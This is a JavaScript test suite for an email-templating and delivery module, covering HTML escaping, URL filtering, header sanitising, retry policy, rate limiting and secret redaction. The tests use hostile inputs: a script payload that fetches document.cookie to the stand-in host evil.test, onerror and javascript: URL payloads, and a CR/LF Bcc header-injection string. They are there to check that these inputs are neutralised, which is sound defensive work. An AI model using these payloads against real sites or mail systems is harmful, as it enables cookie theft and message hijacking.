import { describe, it, expect, beforeEach, vi } from "vitest";

import {
  escapeHtml,
  safeUrl,
  sanitizeHeader,
  renderTemplate,
  renderLayout,
  TEMPLATE_NAMES,
} from "@/utils/emailTemplates";

import { classifyFailure, isValidEmail, redactSecrets, emailMode } from "@/utils/emailProvider";

/**
 * The provider is the only thing here that would touch a network. Everything
 * else — escaping, classification, the retry decision — is real code under
 * test. `importOriginal` keeps classifyFailure/isValidEmail genuine so a test
 * of the retry decision is a test of the real policy, not of a stub.
 */
const provider = { calls: [], results: [] };

vi.mock("@/utils/emailProvider", async (importOriginal) => {
  const actual = await importOriginal();
  return {
    ...actual,
    sendViaProvider: async (message, options) => {
      provider.calls.push({ message, options });
      const next = provider.results.shift();
      if (typeof next === "function") return next();
      return next || { ok: true, provider: "mock", messageId: "mock-1", error: null, failureKind: null };
    },
    insertEmailLog: async (entry) => {
      provider.logs.push({ op: "insert", entry });
      return "log-1";
    },
    updateEmailLog: async (id, entry) => {
      provider.logs.push({ op: "update", id, entry });
      return true;
    },
    emailLogEnabled: () => true,
  };
});

const {
  sendEmail,
  sendTemplatedEmail,
  deliverWithRetry,
  shouldRetry,
  backoffFor,
  resetRateLimiter,
  MAX_ATTEMPTS,
} = await import("@/utils/emailService");

provider.logs = [];

beforeEach(() => {
  provider.calls = [];
  provider.results = [];
  provider.logs = [];
  resetRateLimiter();
});

// ── Escaping ─────────────────────────────────────────────────────────
//
// The reason this module exists. Before it, task titles, org names and
// reviewer names were interpolated into template literals raw.

describe("HTML escaping", () => {
  it("escapes every character that can break out of markup", () => {
    expect(escapeHtml(`<script>alert("x")</script>`)).toBe(
      "&lt;script&gt;alert(&quot;x&quot;)&lt;/script&gt;"
    );
    expect(escapeHtml("Tom & Jerry's")).toBe("Tom &amp; Jerry&#39;s");
  });

  it("escapes & first so an escaped entity is not double-decoded", () => {
    // If < were escaped before &, "&lt;" would come out as "&amp;lt;" only
    // when the source already contained "&lt;" — the ordering is what keeps
    // `&amp;` from being produced for a `<` the caller wrote.
    expect(escapeHtml("&lt;b&gt;")).toBe("&amp;lt;b&amp;gt;");
  });

  it("truncates the source before escaping, never mid-entity", () => {
    const out = escapeHtml("<".repeat(10), 3);
    expect(out).toBe("&lt;&lt;&lt;");
    expect(out).not.toMatch(/&[a-z]*$/);
  });

  it("handles null, undefined and non-strings without throwing", () => {
    expect(escapeHtml(null)).toBe("");
    expect(escapeHtml(undefined)).toBe("");
    expect(escapeHtml(42)).toBe("42");
    expect(escapeHtml({})).toBe("[object Object]");
  });

  it("a task title containing a script tag never becomes markup", () => {
    const title = '<script>fetch("//evil.test?c="+document.cookie)</script>';
    const { html } = renderTemplate("task_assigned", {
      taskTitle: title,
      projectName: '<img src=x onerror="alert(1)">',
      assignerName: "</h2><b>boss</b>",
      taskUrl: "https://app.test/tasks/1",
    });

    expect(html).not.toContain("<script>");
    expect(html).not.toContain("<img");
    // The words survive as inert text; what must not exist is a tag carrying
    // them, so assert on the markup shape rather than on the substring.
    expect(html).not.toMatch(/<[a-z]+[^>]*onerror/i);
    expect(html).toContain("&lt;script&gt;");
    expect(html).toContain("&lt;img src=x onerror=&quot;alert(1)&quot;&gt;");
    // The escaped text is still present, so the recipient sees what was typed.
    expect(html).toContain("document.cookie");
  });

  it("escapes injected values in every template, not just the ones with a title", () => {
    const payload = '"><script>alert(1)</script>';
    for (const name of TEMPLATE_NAMES) {
      const { html, subject } = renderTemplate(name, {
        orgName: payload,
        taskTitle: payload,
        itemTitle: payload,
        contextTitle: payload,
        employeeName: payload,
        actorName: payload,
        assignerName: payload,
        requesterName: payload,
        approverName: payload,
        reviewerName: payload,
        projectName: payload,
        reason: payload,
        message: payload,
        excerpt: payload,
        note: payload,
        roleLabel: payload,
        heading: payload,
        checklist: [payload],
        url: "https://app.test/x",
      });
      expect(html, `${name} leaked a script tag`).not.toContain("<script>");
      expect(html, `${name} leaked the raw payload`).not.toContain(payload);
      // A subject is a mail header, not HTML — it must carry no CR/LF instead.
      expect(subject, `${name} subject has a newline`).not.toMatch(/[\r\n]/);
    }
  });

  it("keeps a script tag out of the shared layout body slot too", () => {
    const html = renderLayout({
      title: "<b>t</b>",
      heading: "<b>h</b>",
      details: [{ label: "<b>l</b>", value: "<b>v</b>" }],
      footerNote: "<b>f</b>",
      ctaLabel: "<b>c</b>",
      ctaUrl: "https://app.test",
    });
    expect(html).not.toContain("<b>");
    expect(html).toContain("&lt;b&gt;");
  });
});

describe("URL safety", () => {
  it("passes absolute http(s) and site-relative links through", () => {
    expect(safeUrl("https://app.test/invite/abc-def")).toBe("https://app.test/invite/abc-def");
    expect(safeUrl("http://app.test/x")).toBe("http://app.test/x");
    expect(safeUrl("/invite/abc-def")).toBe("/invite/abc-def");
  });

  it("escapes ampersands in query strings so the href cannot be split", () => {
    expect(safeUrl("https://app.test/x?a=1&b=2")).toBe("https://app.test/x?a=1&amp;b=2");
  });

  it("drops any scheme that is not http(s), including obfuscated ones", () => {
    expect(safeUrl("javascript:alert(1)")).toBe("");
    expect(safeUrl("JaVaScRiPt:alert(1)")).toBe("");
    expect(safeUrl("java\tscript:alert(1)")).toBe("");
    expect(safeUrl("java\nscript:alert(1)")).toBe("");
    expect(safeUrl("data:text/html;base64,PHNjcmlwdD4=")).toBe("");
    expect(safeUrl("vbscript:msgbox(1)")).toBe("");
  });

  it("omits the CTA entirely when the URL is rejected", () => {
    const { html } = renderTemplate("invitation", {
      orgName: "Acme",
      inviteUrl: "javascript:alert(1)",
    });
    expect(html).not.toContain("javascript:");
    expect(html).not.toContain("Accept invitation");
  });
});

describe("header sanitising", () => {
  it("strips CR/LF so a subject cannot append headers", () => {
    const dirty = "Hello\r\nBcc: attacker@evil.test";
    expect(sanitizeHeader(dirty)).toBe("Hello Bcc: attacker@evil.test");
    expect(sanitizeHeader(dirty)).not.toMatch(/[\r\n]/);
  });

  it("carries through into a rendered subject", () => {
    const { subject } = renderTemplate("task_assigned", {
      taskTitle: "Ship it\nBcc: attacker@evil.test",
    });
    expect(subject).not.toMatch(/[\r\n]/);
  });
});

// ── Failure classification and the retry decision ────────────────────

describe("classifyFailure", () => {
  it("treats a rejected recipient as permanent", () => {
    expect(classifyFailure({ message: "Invalid recipient" })).toBe("permanent");
    expect(classifyFailure({ message: "550 5.1.1 User unknown", responseCode: 550 })).toBe("permanent");
    expect(classifyFailure({ name: "validation_error", statusCode: 422 })).toBe("permanent");
    expect(classifyFailure({ message: "no such user here" })).toBe("permanent");
  });

  it("treats a rejected credential and a malformed request as permanent", () => {
    expect(classifyFailure({ statusCode: 401, message: "API key is invalid" })).toBe("permanent");
    expect(classifyFailure({ statusCode: 403 })).toBe("permanent");
    expect(classifyFailure({ statusCode: 400 })).toBe("permanent");
    expect(classifyFailure({ responseCode: 535, message: "auth failed" })).toBe("permanent");
  });

  it("treats throttling, provider 5xx and connection errors as transient", () => {
    expect(classifyFailure({ statusCode: 429 })).toBe("transient");
    expect(classifyFailure({ statusCode: 503 })).toBe("transient");
    expect(classifyFailure({ code: "ECONNRESET" })).toBe("transient");
    expect(classifyFailure({ code: "ETIMEDOUT" })).toBe("transient");
    expect(classifyFailure({ responseCode: 421, message: "try again later" })).toBe("transient");
    expect(classifyFailure({ message: "socket hang up" })).toBe("transient");
  });

  it("distinguishes SMTP 5xx (permanent) from HTTP 5xx (transient)", () => {
    // nodemailer only ever sets responseCode; a 5xx there is a rejection.
    expect(classifyFailure({ responseCode: 552 })).toBe("permanent");
    expect(classifyFailure({ statusCode: 552 })).toBe("transient");
  });

  it("falls back to transient for an unrecognised failure", () => {
    expect(classifyFailure({ message: "something odd happened" })).toBe("transient");
    expect(classifyFailure(null)).toBe("transient");
  });
});

describe("shouldRetry", () => {
  it("never retries a permanent failure, at any attempt", () => {
    expect(shouldRetry("permanent", 1)).toBe(false);
    expect(shouldRetry("permanent", 2)).toBe(false);
  });

  it("retries a transient failure until the cap", () => {
    expect(shouldRetry("transient", 1)).toBe(true);
    expect(shouldRetry("transient", 2)).toBe(true);
    expect(shouldRetry("transient", 3)).toBe(false);
  });

  it("cannot be pushed past the hard ceiling", () => {
    expect(MAX_ATTEMPTS).toBe(3);
    expect(shouldRetry("transient", 3, 99)).toBe(false);
    expect(shouldRetry("transient", 1, 1)).toBe(false);
  });

  it("does not retry a success", () => {
    expect(shouldRetry(null, 1)).toBe(false);
  });

  it("backs off exponentially", () => {
    expect(backoffFor(1, 400)).toBe(400);
    expect(backoffFor(2, 400)).toBe(800);
    expect(backoffFor(3, 400)).toBe(1600);
  });
});

describe("deliverWithRetry", () => {
  const noSleep = async () => {};

  it("stops after one attempt on a permanent failure", async () => {
    let calls = 0;
    const result = await deliverWithRetry({
      send: async () => {
        calls += 1;
        return { ok: false, error: "Invalid recipient", failureKind: "permanent" };
      },
      sleep: noSleep,
    });
    expect(calls).toBe(1);
    expect(result.attempts).toBe(1);
    expect(result.ok).toBe(false);
    expect(result.failureKind).toBe("permanent");
  });

  it("retries a transient failure and reports the attempt it succeeded on", async () => {
    let calls = 0;
    const result = await deliverWithRetry({
      send: async () => {
        calls += 1;
        if (calls < 3) return { ok: false, error: "429 rate limited", failureKind: "transient" };
        return { ok: true, provider: "resend", messageId: "abc", failureKind: null };
      },
      sleep: noSleep,
    });
    expect(calls).toBe(3);
    expect(result.ok).toBe(true);
    expect(result.attempts).toBe(3);
    expect(result.messageId).toBe("abc");
  });

  it("gives up after exactly 3 attempts when a transient failure never clears", async () => {
    let calls = 0;
    const result = await deliverWithRetry({
      send: async () => {
        calls += 1;
        return { ok: false, error: "ECONNRESET", failureKind: "transient" };
      },
      sleep: noSleep,
    });
    expect(calls).toBe(3);
    expect(result.attempts).toBe(3);
    expect(result.ok).toBe(false);
  });

  it("waits an exponentially growing interval between attempts", async () => {
    const waits = [];
    await deliverWithRetry({
      send: async () => ({ ok: false, error: "503", failureKind: "transient" }),
      sleep: async (ms) => waits.push(ms),
      baseDelayMs: 100,
    });
    expect(waits).toEqual([100, 200]);
  });

  it("classifies a thrown error rather than letting it escape", async () => {
    let calls = 0;
    const result = await deliverWithRetry({
      send: async () => {
        calls += 1;
        const e = new Error("550 mailbox unavailable");
        e.responseCode = 550;
        throw e;
      },
      sleep: noSleep,
    });
    expect(calls).toBe(1);
    expect(result.ok).toBe(false);
    expect(result.failureKind).toBe("permanent");
  });
});

// ── The send path end to end ─────────────────────────────────────────

describe("sendEmail", () => {
  const noSleep = async () => {};

  it("refuses an invalid address without ever calling the provider", async () => {
    const result = await sendEmail({ to: "not-an-email", subject: "Hi", html: "<p>hi</p>", sleep: noSleep });
    expect(provider.calls).toHaveLength(0);
    expect(result.ok).toBe(false);
    expect(result.permanent).toBe(true);
    expect(result.attempts).toBe(1);
    expect(result.error).toBe("invalid recipient address");
  });

  it("records the refusal as a failed email_log row", async () => {
    await sendEmail({ to: "nope@@example", subject: "Hi", html: "<p>hi</p>", sleep: noSleep });
    const inserted = provider.logs.filter((l) => l.op === "insert");
    expect(inserted).toHaveLength(1);
    expect(inserted[0].entry.status).toBe("failed");
    expect(inserted[0].entry.attempts).toBe(1);
  });

  it("drops only the invalid recipients from a mixed list", async () => {
    provider.results = [{ ok: true, provider: "resend", messageId: "m1", failureKind: null }];
    const result = await sendEmail({
      bcc: ["good@example.com", "bad@@example", "also.good@example.co.uk"],
      subject: "Hi",
      html: "<p>hi</p>",
      sleep: noSleep,
    });
    expect(result.ok).toBe(true);
    expect(provider.calls[0].message.bcc).toEqual(["good@example.com", "also.good@example.co.uk"]);
    expect(result.invalid).toEqual(["bad@@example"]);
  });

  it("does not retry a permanent provider failure", async () => {
    provider.results = [
      { ok: false, provider: "resend", error: "Invalid recipient", failureKind: "permanent" },
      { ok: true, provider: "resend", messageId: "never-used", failureKind: null },
    ];
    const result = await sendEmail({ to: "a@example.com", subject: "Hi", html: "<p>hi</p>", sleep: noSleep });
    expect(provider.calls).toHaveLength(1);
    expect(result.ok).toBe(false);
    expect(result.permanent).toBe(true);
    expect(result.attempts).toBe(1);
  });

  it("retries a transient provider failure and logs the attempt count", async () => {
    provider.results = [
      { ok: false, provider: "resend", error: "429 too many requests", failureKind: "transient" },
      { ok: true, provider: "resend", messageId: "m2", failureKind: null },
    ];
    const result = await sendEmail({ to: "a@example.com", subject: "Hi", html: "<p>hi</p>", sleep: noSleep });
    expect(provider.calls).toHaveLength(2);
    expect(result.ok).toBe(true);
    expect(result.attempts).toBe(2);

    const update = provider.logs.find((l) => l.op === "update");
    expect(update.entry.status).toBe("sent");
    expect(update.entry.attempts).toBe(2);
    expect(update.entry.messageId).toBe("m2");
  });

  it("marks a mock send as ok but not delivered", async () => {
    provider.results = [{ ok: true, provider: "mock", messageId: "mock-9", failureKind: null }];
    const result = await sendEmail({ to: "a@example.com", subject: "Hi", html: "<p>hi</p>", sleep: noSleep });
    expect(result.ok).toBe(true);
    expect(result.delivered).toBe(false);
    expect(result.skipped).toBe(true);
    const update = provider.logs.find((l) => l.op === "update");
    expect(update.entry.status).toBe("mocked");
  });

  it("tells the provider not to write its own mock row (one send, one row)", async () => {
    provider.results = [{ ok: true, provider: "mock", messageId: "mock-9", failureKind: null }];
    await sendEmail({ to: "a@example.com", subject: "Hi", html: "<p>hi</p>", sleep: noSleep });
    expect(provider.calls[0].options.recordMock).toBe(false);
  });

  it("rate limits a recipient rather than letting a loop drain the quota", async () => {
    process.env.EMAIL_MAX_PER_RECIPIENT_PER_HOUR = "2";
    try {
      provider.results = [
        { ok: true, provider: "resend", messageId: "m1", failureKind: null },
        { ok: true, provider: "resend", messageId: "m2", failureKind: null },
      ];
      await sendEmail({ to: "loop@example.com", subject: "1", html: "x", sleep: noSleep });
      await sendEmail({ to: "loop@example.com", subject: "2", html: "x", sleep: noSleep });
      const third = await sendEmail({ to: "loop@example.com", subject: "3", html: "x", sleep: noSleep });

      expect(provider.calls).toHaveLength(2);
      expect(third.ok).toBe(false);
      expect(third.rateLimited).toBe(true);
      // Rate limiting is not permanent — the caller may try again later.
      expect(third.permanent).toBe(false);
    } finally {
      delete process.env.EMAIL_MAX_PER_RECIPIENT_PER_HOUR;
    }
  });

  it("logs 'queued' before the attempt and the outcome after", async () => {
    provider.results = [{ ok: true, provider: "resend", messageId: "m3", failureKind: null }];
    await sendEmail({ to: "a@example.com", subject: "Hi", html: "<p>hi</p>", sleep: noSleep });
    expect(provider.logs[0].op).toBe("insert");
    expect(provider.logs[0].entry.status).toBe("queued");
    expect(provider.logs[1].op).toBe("update");
    expect(provider.logs[1].entry.status).toBe("sent");
    expect(provider.logs[1].entry.sentAt).toBeTruthy();
  });

  it("never lets a failure message carry the recipient's send off a cliff", async () => {
    provider.results = [
      { ok: false, provider: "smtp", error: "boom", failureKind: "transient" },
      { ok: false, provider: "smtp", error: "boom", failureKind: "transient" },
      { ok: false, provider: "smtp", error: "boom", failureKind: "transient" },
    ];
    const result = await sendEmail({ to: "a@example.com", subject: "Hi", html: "x", sleep: noSleep });
    expect(result.ok).toBe(false);
    expect(result.attempts).toBe(3);
    const update = provider.logs.find((l) => l.op === "update");
    expect(update.entry.status).toBe("failed");
    expect(update.entry.attempts).toBe(3);
  });
});

describe("sendTemplatedEmail", () => {
  const noSleep = async () => {};

  it("renders the named template and hands escaped HTML to the provider", async () => {
    provider.results = [{ ok: true, provider: "resend", messageId: "m4", failureKind: null }];
    await sendTemplatedEmail({
      template: "invitation",
      to: "new@example.com",
      organizationId: "org-1",
      data: { orgName: "<script>Acme</script>", roleLabel: "Admin", inviteUrl: "https://app.test/invite/t" },
      sleep: noSleep,
    });
    const sent = provider.calls[0].message;
    expect(sent.html).not.toContain("<script>");
    expect(sent.html).toContain("&lt;script&gt;");
    expect(sent.text).toBeTruthy();
    expect(provider.calls[0].options.template).toBe("invitation");
  });

  it("falls back to a generic template rather than throwing on an unknown name", async () => {
    provider.results = [{ ok: true, provider: "resend", messageId: "m5", failureKind: null }];
    const result = await sendTemplatedEmail({
      template: "no_such_template",
      to: "a@example.com",
      data: { message: "hello" },
      sleep: noSleep,
    });
    expect(result.ok).toBe(true);
    expect(provider.calls[0].options.template).toBe("automation");
  });
});

// ── Secrets ──────────────────────────────────────────────────────────

describe("secret handling", () => {
  it("redacts key-shaped material from anything that leaves the module", () => {
    expect(redactSecrets("failed with re_abc123DEF456ghi")).toBe("failed with [redacted]");
    expect(redactSecrets("Authorization: Bearer sk-live-0123456789")).toContain("[redacted]");
    expect(redactSecrets("smtp password=hunter2hunter2")).toContain("[redacted]");
  });

  it("redacts the configured key by exact value", () => {
    process.env.RESEND_API_KEY = "totally-secret-value";
    try {
      expect(redactSecrets("upstream said totally-secret-value is bad")).toBe(
        "upstream said [redacted] is bad"
      );
    } finally {
      delete process.env.RESEND_API_KEY;
    }
  });

  it("reports the mode without exposing a credential", () => {
    expect(["resend", "smtp", "mock"]).toContain(emailMode());
    process.env.RESEND_API_KEY = "rk-test";
    try {
      expect(emailMode()).toBe("resend");
    } finally {
      delete process.env.RESEND_API_KEY;
    }
  });
});

describe("address validation", () => {
  it("accepts real addresses", () => {
    expect(isValidEmail("a@example.com")).toBe(true);
    expect(isValidEmail("first.last+tag@sub.example.co.uk")).toBe(true);
  });

  it("rejects the shapes that cause hard bounces or header injection", () => {
    expect(isValidEmail("")).toBe(false);
    expect(isValidEmail("no-at-sign")).toBe(false);
    expect(isValidEmail("a@localhost")).toBe(false);
    expect(isValidEmail("a@@example.com")).toBe(false);
    expect(isValidEmail("a@example.com\nBcc: x@y.com")).toBe(false);
    expect(isValidEmail("a b@example.com")).toBe(false);
    expect(isValidEmail(`${"a".repeat(250)}@example.com`)).toBe(false);
  });
});
